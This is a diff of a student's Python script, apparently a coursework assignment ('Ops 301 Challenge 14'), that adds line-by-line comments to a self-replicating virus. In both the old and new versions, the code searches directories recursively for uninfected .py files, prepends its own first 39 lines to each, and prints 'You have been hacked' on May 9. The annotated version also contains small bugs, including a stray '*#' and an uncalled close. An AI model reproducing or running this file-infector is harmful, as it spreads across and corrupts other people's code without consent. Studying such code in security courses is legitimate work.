@@ -2,49 +2,51 @@ Author:   Malena Tomlin
 Course/Purpose: Ops 301 Challenge 14
 Date: 12/2023
 
-import os
-import datetime
+#!/usr/bin/python3 # Instructs computer to use python3 for scripts to run.
+import os # OS module is imported.
+import datetime # datetime module imported.
 
-SIGNATURE = "# INFECTED"
+SIGNATURE = "VIRUS" # For setting the variable Signature to virus for the hack.
 
-def locate(path):
-    files_targeted = []
-    filelist = os.listdir(path)
-    for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
-            files_targeted.extend(locate(path+"/"+fname))
-        elif fname[-3:] == ".py":
-            infected = False
-            for line in open(path+"/"+fname):
-                if SIGNATURE in line:
-                    infected = True
-                    break
-            if not infected:
-                files_targeted.append(path+"/"+fname)
-    return files_targeted
+# The def locate(path): For locating the path to the file; its the function.
+def locate(path): # Function location is defined here.
+    files_targeted = [] # Varible for files_targeted to empty is set.
+    filelist = os.listdir(path) *# Variable filelist for the list of files in path is set.
+    for fname in filelist: # Begins a 'for' loop that repeats through specified list of files or list of files in general.
+        if os.path.isdir(path+"/"+fname): # Checks directory for file.
+            files_targeted.extend(locate(path+"/"+fname)) # The list of files in the directory is included in the files_targeted.
+        elif fname[-3:] == ".py": # Checks for python file.
+            infected = False # Changes the infected variable to False.
+            for line in open(path+"/"+fname): # The for loop is started here where it repeats through all files.
+                if SIGNATURE in line: # The signature is checked in the line.
+                    infected = True # This changes the infected variable to True.
+                    break # The for loop is set to break.
+            if infected == False: # CHecks if infected variabel is False.
+                files_targeted.append(path+"/"+fname) # The list of files_targeted is appended.
+    return files_targeted # The files_targeted here is set to return.
 
-def infect(files_targeted):
-    virus = open(os.path.abspath(__file__))
-    virusstring = ""
-    for i, line in enumerate(virus):
-        if 0 <= i < 39:
-            virusstring += line
-    virus.close()
-    for fname in files_targeted:
-        f = open(fname)
-        temp = f.read()
-        f.close()
-        f = open(fname, "w")
-        f.write(virusstring + temp.replace("#!/usr/bin/python3", "#!/usr/bin/env python3"))  # Modify shebang
-        f.close()
+# The def infect(files_targeted): This function is set to infect the files_targeted for the hack.
+def infect(files_targeted): # The function to infect is defined.
+    virus = open(os.path.abspath(__file__)) # The file is opened.
+    virusstring = "" # The virsustring is set to an empty string.
+    for i,line in enumerate(virus): # The for loop is started here to repeat through all the files.
+        if 0 <= i < 39: # The command checks that the line is between the numbers 0 through 39.
+            virusstring += line # A line is added to the virusstring.
+    virus.close # The virus file is set to close.
+    for fname in files_targeted: # The for loop is set to repeat throughout all files-targeted.
+        f = open(fname) # The file is open.
+        temp = f.read() # The variable temp is set for the file contents.
+        f.close() # The file is set to close.
+        f = open(fname,"w") # The file opens in the write mode.
+        f.write(virusstring + temp) # The command is set to write the virusstring and contents to the file.
+        f.close() # The file is set to close.
 
-def detonate():
-    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
-        print("You have been hacked")
+# The def detonate(): The function is to detonate the virus.
+def detonate(): # This is where the detonation is set to be defined.
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # This checks the date for the detonation to be set for May 9th.
+        print("You have been hacked") # The print is the message set to say, "You have been hacked."
 
-files_targeted = locate(os.path.abspath(""))
-infect(files_targeted)
-detonate()
-
-
-Sourced by OpenAI for analysis and reproducing an example.
+# The comuter is activated by the last lines of code.
+files_targeted = locate(os.path.abspath("")) # The variable files_targeted is set to the list of files in the directory.
+infect(files_targeted) # This sets the function to infect the files_targeted.
+detonate() # The function is activated to detonate.
